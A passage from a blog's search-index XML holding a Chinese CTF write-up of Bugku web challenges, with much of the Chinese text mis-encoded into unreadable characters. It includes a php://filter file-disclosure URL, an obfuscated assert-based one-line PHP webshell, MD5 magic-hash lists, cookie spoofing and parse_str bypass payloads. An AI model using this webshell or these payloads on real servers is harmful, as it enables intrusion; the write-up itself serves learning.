(ËøôÈáåÂÄºÂæóÊ≥®ÊÑèÁöÑÂ∞±ÊòØÔºå64‰ΩçÁ≥ªÁªüÂíå32‰ΩçÁ≥ªÁªü‰º†ÂèÇÊòØ‰∏ç‰∏ÄÊ†∑ÁöÑ)]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku webÈ¢òÁõÆÁöÑwp]]></title>
    <url>%2F2019%2F02%2F07%2Fbugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp%2F</url>
    <content type="text"><![CDATA[welcome to bugkuctf ctrl + UÊü•ÁúãÈ°µÈù¢Ê∫ê‰ª£Á†ÅÔºå Â¶ÇÊûúÊúâ $user‰∏î file_get_contents($user, 'r') ÁöÑ ÂÄºÊòØ ÊåáÂÆöÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ Â∞±‰ºö include $file ÁöÑÂÜÖÂÆπ „ÄÇ Âπ∂‰∏îÊèêÁ§∫ÊòØ hint.phpËøô‰∏™Êñá‰ª∂ ËøôÈáåÊ∂âÂèäÂà∞‰∏Ä‰∏™ÊÄé‰πàÊää get ÊñπÊ≥ï‰º†ÂÖ•ÁöÑÂèÇÊï∞‰Ωú‰∏∫‰∏Ä‰∏™Êñá‰ª∂ÊâìÂºÄ„ÄÇ php‰º™ÂçèËÆÆ ËøôÈáåÁî®Âà∞‰∫Ü php://input ‰ΩÜÊòØ„ÄÇ„ÄÇ ËøôÂ∞±Ë¶ÅÁî®Âà∞Á¨¨‰∫å‰∏™‰º™ÂçèËÆÆÔºö php://filter ÊàëÈÇ£Ê†∑‰º†ÈÄíÂèÇÊï∞‰ºöÊä•ÈîôÔºå include($file) Âè™ÊòØÊää $file Ëøô‰∏™ÂèòÈáèÂΩì‰ΩúÊñá‰ª∂ÂêçÂåÖÊã¨ËøõÂéª‰∫Ü„ÄÇ Â∞±ÊòØÂê´Âú®Ê∫ê‰ª£Á†ÅÈáåÔºå ‰∏çÊòØÁÆÄÂçïÂú∞ÊûÑÈÄ†‰∏Ä‰∏™ÂèÇÊï∞Â∞±ËÉΩËææÂà∞ÁöÑ„ÄÇ ËøôÂ∞±ÊòØ‰∏Ä‰∏™Ê≥ÑÈú≤‰∫ÜÊ∫êÁ†ÅÁöÑÊºèÊ¥û‰∫Ü„ÄÇ ÊúÄÂêéÊûÑÈÄ†ÁöÑURLÂ¶Ç‰∏ãÔºö http://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php ÊÉäÂèπ„ÄÇ base64 Ëß£ÂØÜ‰πãÂêéÁöÑÊ∫ê‰ª£Á†Å„ÄÇ 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; ‰ª£Á†ÅÈáåÈù¢ÊûÑÈÄ†‰∫Ü‰∏Ä‰∏™Á±ª„ÄÇ ÂÖ¨ÊúâÂèòÈáèÊòØ $file ÁªßÁª≠Áúã‰∏Ä‰∏ã index.php ÁöÑÊ∫ê‰ª£Á†Å 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "√§¬∏¬ç√®¬É¬Ω√ß¬é¬∞√•¬ú¬®√•¬∞¬±√ß¬ª¬ô√§¬Ω flag√•¬ì¬¶"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; ÊúâÂá†‰∏™Âú∞ÊñπÊöÇÊó∂ÂÜô‰∏çÂà∞‰ΩçÔºå ÂÖàÂà∞ËøôÈáåÂ•Ω‰∫Ü„ÄÇ ËøáÁãó‰∏ÄÂè•ËØù ÂæàËíô 1234&lt;?php $poc="a#s#s#e#r#t";$poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; ‰∏äÈù¢ÊòØÈ¢òÁõÆÊèêÁ§∫ÁöÑËøáÁãó‰∏ÄÂè•ËØù‰ª£Á†Å„ÄÇ ÁÑ∂Âêé...ÂêéÈù¢ÁöÑ‰∏ç‰ºö‰∫Ü Â≠óÁ¨¶ÔºåÊ≠£ÂàôÔºü ÂâçÂ•≥Âèã ‰∏ÄÈÅìÂæàÊúâË∂£ÁöÑÈ¢òÁõÆÔºå Â∞±‰∏çËØ¥È¢òÁõÆ‰∫ÜÔºå Áõ¥Êé•ÊîæÊàëÁöÑÊµãËØï‰ª£Á†Å 123456789101112131415161718192021&lt;?phperror_reporting(0);if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; echo "$v1&lt;/br&gt;"; var_dump($v1); echo "&lt;/br&gt;"; echo md5($v1)."&lt;/br&gt;"; echo "$v2&lt;/br&gt;"; echo md5($v2)."&lt;/br&gt;"; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; echo "true"; &#125; else &#123; echo "false"; &#125;&#125;?&gt; ‰πüÊòØÁ¨¨‰∏ÄÊ¨°ÂèëÁé∞getËøòËÉΩ‰º†ÈÄíÊï∞ÁªÑÔºà‰∏çËøáÂΩìÁÑ∂ÊòØ‰∏ÄÂ†ÜÁöÑÈîôËØØÔºâ MD5 collision Ëøò‰∏çÂ§™Ê∏ÖÊ•öMD5 Á¢∞ÊíûÊòØÂï•Ôºå ‰ª•ÂêéË°•Âùë payload 120.24.86.145:9009/md5.php?a=s878926199a Â∏∏Áî®ÁöÑMD5Á¢∞Êíû 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 ÁßãÂêçÂ±±ËÄÅÂè∏Êú∫ 123456789101112&lt;head&gt;&lt;title&gt;‰∏ãÈù¢ÁöÑË°®ËææÂºèÁöÑÂÄºÊòØÁßãÂêçÂ±±ÁöÑËΩ¶ÈÄü&lt;/title&gt;&lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;p&gt;‰∫≤ËØ∑Âú®2sÂÜÖËÆ°ÁÆóËÄÅÂè∏Êú∫ÁöÑËΩ¶ÈÄüÊòØÂ§öÂ∞ë&lt;/p&gt;&lt;div&gt;1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;&lt;/div&gt;&lt;style&gt;div,p&#123;text-align: center;margin: 0 auto;&#125;&lt;/style&gt; ‰∏§Áßí‰πãÂÜÖËÆ°ÁÆóÂá∫ÂºèÂ≠ê‰∏≠ÁöÑÂÄºÔºå ÂÜçÊèê‰∫§ ËèúÈ∏°Ëøò‰∏çÂ§™‰ºöÂÜôËÑöÊú¨ ÂèÇËÄÉ‰∫Üdalao‰ª¨ÁöÑ‰ª£Á†Å 123456789import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()source = s.get(url)expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()result = eval(expression)post = &#123;'value': result&#125;print(s.post(url, data = post).text) ‰∏çËøáËøòÊòØÊ≤°ÊêûÂá∫Êù•„ÄÇ Â§ç‰π†‰∏Ä‰∏ãrequestsÂ∫ì 1234567import requests#ÊûÑÈÄ†requestsÂØπË±°s = requests.get(url)s.post(url, )#Â∑Æ‰∏çÂ§öÂ∞±Ëøô‰∫õ‰∫Ü cookiesÊ¨∫È™ó ÁÑ∂ËÄåÊ≥®ÊÑèÂà∞URL‰∏≠ÁöÑlineÂíåfileÊó∂Â∞±ËÉΩÂÅöÂá∫Êù•‰∫Ü„ÄÇ 1234567#Áî®ËÑöÊú¨Êää‰ª£Á†ÅË∑ëÂá∫Êù•import requestsa=30for i in range(a): url="http://120.24.86.145:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s=requests.get(url) print s.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //ÁúãËøôÈáå $file_list[2]='keys.php'; &#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; ÊûÑÈÄ†cookieÂ∞±Ë°åÂï¶ ÔºàÁÑ∂ËÄåÊ≤°ÊêûÂá∫flagÊù•Ôºâ login4 CBCÂ≠óËäÇÁøªËΩ¨ÊîªÂáª Êîæ‰∏ÄÂº†ÁªèÂÖ∏ÁöÑÂõæ ÊçÆÂ∏àÂÇÖ‰ª¨ÁöÑwpËØ¥ÊòØÊúâ‰∏Ä‰∏™index.php.swpÊñá‰ª∂Â≠òÂú®„ÄÇ ÁÑ∂ËÄåÊ≤°ÊâæÂà∞Ôºå ÂÖàÊääÂ∏àÂÇÖ‰ª¨ÊâæÂà∞ÁöÑÊ∫êÁ†ÅÊîæ‰∏äÊù• 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; info = array('username'=&gt;username,'password'=&gt;password); login(info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class="login-body"&gt; &lt;div id="wrapper"&gt; &lt;div class="user-icon"&gt;&lt;/div&gt; &lt;div class="pass-icon"&gt;&lt;/div&gt; &lt;form name="login-form" class="login-form" action="" method="post"&gt; &lt;div class="header"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt; &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;input type="submit" name="submit" value="Login" class="button" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;&lt;/html&gt; Â§á‰ªΩÊòØ‰∏™Â•Ω‰π†ÊÉØ Ê†πÊçÆ‰ª•ÂâçÂÅöÈ¢òÁöÑÁªèÈ™åÔºå Â§á‰ªΩÂ∞±ÊòØÂú®ÊèêÁ§∫‰Ω† Â≠òÂú®bakÊñá‰ª∂ ÊâÄ‰ª•Áõ¥Êé•ËæìÂÖ•URL‰∏∫ http://123.206.87.240:8002/web16/index.php.bak ÁÑ∂Âêé‰∏ãËΩΩÊñá‰ª∂ ‰ª£Á†ÅÔºö 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."ÂèñÂæóflag";&#125;?&gt; ÂÅö‰ª£Á†ÅÂÆ°ËÆ°ÁöÑÈ¢òÁõÆÔºå ËøòÊòØ‰∏ªË¶ÅÈù†Ëá™Â∑±Â∞ùËØï„ÄÇ 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);$str = strstr($_SERVER['REQUEST_URI'], '?');echo "$str"."&lt;/br&gt;";$str = substr($str, 1);echo "$str"."&lt;/br&gt;";$str = str_replace('key','', $str);echo "$str"."&lt;/br&gt;";parse_str($str);echo "$key1"."&lt;/br&gt;";echo md5($key1);echo "&lt;/br&gt;";echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2) echo 'flag';?&gt; ‰∏äÈù¢ÊòØÊàëÁî®Êù•ÊµãËØïÁöÑ‰ª£Á†Å ÊûÑÈÄ†URL‰∏∫ http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2 ËæìÂá∫‰∫ÜËøô‰∫õÔºö 123456?kkeyey1=1&amp;kkeyey2=2kkeyey1=1&amp;kkeyey2=2key1=1&amp;key2=21c4ca4238a0b923820dcc509a6f75849bc81e728d9d4c2f636f067f89cc14862c ‰πãÂâçËøòÂæàÁñëÊÉë‰∏∫‰ªÄ‰πàÊ≤°ÊúâgetÈÉΩËÉΩÂæóÂà∞ÂèòÈáèÔºå ÂéüÊù•ÊòØparse_strËøô‰∏™ÂáΩÊï∞Âú®Ëµ∑‰ΩúÁî®„ÄÇ OKÔºå Áé∞Âú®Â∞±ÊòØË°®ÊºîÁöÑÊó∂Èó¥‰∫Ü„ÄÇ ÂèÇËÄÉËµÑÊñô https://blog.csdn.net/wy_97/article/details/77431111 https://www.cnblogs.com/Pinging/p/8278168.html https://blog.csdn.net/qq_19861715/article/details/79384018 https://blog.csdn.net/qq_39629343/article/details/80696263 ÁßãÂêçÂ±±ËÄÅÂè∏Êú∫ cookieÊ¨∫È™ó CBCÂ≠óËäÇÁøªËΩ¨ÊîªÂáª python requestsÂ∫ìÂ≠¶‰π†]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
